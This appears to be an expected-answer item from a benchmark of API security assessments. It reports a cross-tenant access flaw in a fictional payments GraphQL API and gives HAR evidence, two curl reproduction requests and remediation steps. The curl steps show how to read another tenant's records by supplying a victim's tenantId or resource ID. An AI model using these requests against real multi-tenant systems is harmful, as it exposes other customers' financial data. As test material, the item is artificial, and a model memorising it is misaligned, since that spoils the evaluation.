# Expected Response

## System
- Domain: FinTech / Payments
- System: PayBridge Transaction API
- Example ID: GQL-0070

## Priority Findings

### Finding 1: Client-Supplied tenantId Trusted Over JWT — Cross-Tenant Financial Data Access (Pattern 1.5)
**Severity:** Critical
**Category:** BOLA / Multi-tenant Access

**Summary:**
Per §5.0 (Pattern 1.5 — multi-tenant/cross-tenant access): "The API accepts `tenantId` as a filter argument. The resolver trusts the client-supplied `tenantId` instead of extracting it from the JWT. Token from `tenant-4015` passes `tenantId: 'tenant-378f'` to access cross-tenant data." An attacker can enumerate any tenant's financial transaction records by supplying a victim's `tenantId` in query arguments. In a payments platform, this exposes transaction amounts, account references, and payment metadata.

**Evidence from HAR:**
- Request: `POST https://api.paybridge-transact.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-4015`
- Query: `getResource(id: "R-2070") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-378f"`, `ownerId: "other-user-4015378f"`, `sensitiveField: "CONFIDENTIAL-4015378f"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-4015378f`

**Root Cause (§4.0 RISK-GQL-070):** `getResource` resolver fetches by `resourceId` only; `listResources(tenantId:)` trusts client-supplied argument.

## Steps to Reproduce

### Step 1 — Direct resource ID access (HAR)
```bash
curl -s -X POST https://api.paybridge-transact.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4015" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2070\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-4015378f` from `tenant-378f`. **Secure:** FORBIDDEN.

### Step 2 — Client-supplied tenantId to list victim transactions (Pattern 1.5 explicit)
```bash
curl -s -X POST https://api.paybridge-transact.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4015" \
  -d '{"query": "query { listResources(tenantId: \"tenant-378f\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** `listResources` uses client-supplied `tenantId` — returns all `tenant-378f` records.

## Remediation
1. `listResources` must NEVER use client-supplied `tenantId` — extract from JWT only.
2. Resolver tenant guard on `getResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
